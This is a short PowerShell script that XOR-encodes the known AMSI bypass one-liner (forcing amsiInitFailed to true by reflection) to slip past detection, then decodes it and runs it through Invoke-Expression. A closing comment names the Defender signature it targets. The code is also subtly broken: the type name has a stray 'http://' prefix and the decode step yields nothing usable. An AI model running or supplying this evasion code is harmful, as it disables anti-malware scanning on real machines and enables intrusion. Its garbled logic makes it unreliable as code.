# Encode the script using XOR
$key = [byte]"A"
$script = "[Ref].Assembly.GetType('http://System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
$encodedScript = [System.Text.Encoding]::Unicode.GetBytes($script)
for ($i = 0; $i -lt $encodedScript.Length; $i++) {
    $encodedScript[$i] = $encodedScript[$i] -bxor $key
}

# Decode the script in memory
$decodedScript = for ($i = 0; $i -lt $encodedScript.Length; $i++) {
    $encodedScript[$i] = $encodedScript[$i] -bxor $key
}
[System.Text.Encoding]::Unicode.GetString($decodedScript)

# To run the decoded script in memory, you can use the Invoke-Expression cmdlet
Invoke-Expression $decodedScript

#Detection Name : Trojan:Win32/AmsiTamper.A!ams
